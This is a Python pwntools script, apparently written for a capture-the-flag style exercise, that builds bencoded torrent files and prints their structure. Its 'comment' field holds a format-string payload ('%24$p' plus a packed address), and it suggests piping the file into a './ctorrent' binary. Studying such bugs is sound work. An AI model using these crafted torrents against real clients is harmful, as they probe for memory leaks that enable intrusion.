#!/usr/bin/env python3
from pwn import *

def show_bencode_structure():
    """展示bencode编码的结构"""
    
    # 示例数据
    announce = b"http://example.com/announce"
    payload = b'AAAAAA' + b"%24$p" + p64(0x55410) # 简单的payload
    name = b"demo"
    piece_len = b"16384"
    pieces = b"01234567890123456789"
    file_length = b"12345"
    
    out = b'd'
    out += b'8:announce' + str(len(announce)).encode() + b':' + announce
    out += b'7:comment' + str(len(payload)).encode() + b':' + payload
    out += b'4:infod'
    out += b'4:name' + str(len(name)).encode() + b':' + name
    out += b'12:piece lengthi' + piece_len + b'e'
    out += b'6:pieces' + b'20:' + pieces
    out += b'6:lengthi' + file_length + b'e'
    out += b'e'
    out += b'e'
    
    print("Raw bencoded data:")
    print(out)
    print("\nHex representation:")
    print(out.hex())
    print("\nHuman-readable structure:")
    
    # 手动解析展示结构
    idx = 0
    depth = 0
    
    def print_indented(msg):
        print("  " * depth + msg)
    
    while idx < len(out):
        if out[idx] == ord('d'):  # 字典开始
            print_indented("d (dictionary start)")
            depth += 1
            idx += 1
        elif out[idx] == ord('e'):  # 字典/列表结束
            depth -= 1
            print_indented("e (end)")
            idx += 1
        elif out[idx] == ord('i'):  # 整数开始
            end_idx = out.index(b'e', idx)
            number = out[idx+1:end_idx]
            print_indented(f"i{number.decode()}e (integer: {number.decode()})")
            idx = end_idx + 1
        elif out[idx] in b'0123456789':  # 字符串长度
            colon_idx = out.index(b':', idx)
            str_len = int(out[idx:colon_idx])
            str_data = out[colon_idx+1:colon_idx+1+str_len]
            
            # 尝试解码字符串内容
            try:
                content = str_data.decode('utf-8', errors='replace')
                if all(c.isprintable() or c in '\n\r\t' for c in content):
                    print_indented(f"{str_len}:{content} (string)")
                else:
                    print_indented(f"{str_len}:[binary data] (hex: {str_data.hex()})")
            except:
                print_indented(f"{str_len}:[binary data] (hex: {str_data.hex()})")
            
            idx = colon_idx + 1 + str_len
        else:
            idx += 1

def create_and_save_example():
    """创建并保存一个示例torrent文件"""
    
    announce = b"http://example.com/announce"
    payload = b"%23$p" + p64(0x55410)  # 简单的格式字符串payload
    name = b"exploit_test"
    piece_len = b"16384"
    pieces = b"01234567890123456789"
    file_length = b"12345"
    
    out = b'd'
    out += b'8:announce' + str(len(announce)).encode() + b':' + announce
    out += b'7:comment' + str(len(payload)).encode() + b':' + payload
    out += b'4:infod'
    out += b'4:name' + str(len(name)).encode() + b':' + name
    out += b'12:piece lengthi' + piece_len + b'e'
    out += b'6:pieces' + b'20:' + pieces
    out += b'6:lengthi' + file_length + b'e'
    out += b'e'
    out += b'e'
    
    # 保存文件
    with open('example_structure.torrent', 'wb') as f:
        f.write(out)
    
    print(f"Created example_structure.torrent ({len(out)} bytes)")
    
    # 显示文件内容
    print("\nFile content (hex):")
    print(out.hex())
    
    # 分组显示，便于理解
    print("\nGrouped hex for analysis:")
    hex_str = out.hex()
    for i in range(0, len(hex_str), 32):
        chunk = hex_str[i:i+32]
        print(f"{i:04x}: {chunk}")

if __name__ == '__main__':
    print("=== Bencode Structure Analysis ===")
    show_bencode_structure()
    
    print("\n" + "="*50 + "\n")
    
    print("=== Example File Creation ===")
    create_and_save_example()
    
    print("\n" + "="*50 + "\n")
    
    print("You can examine the torrent file with:")
    print("hexdump -C example_structure.torrent")
    print("./ctorrent < example_structure.torrent")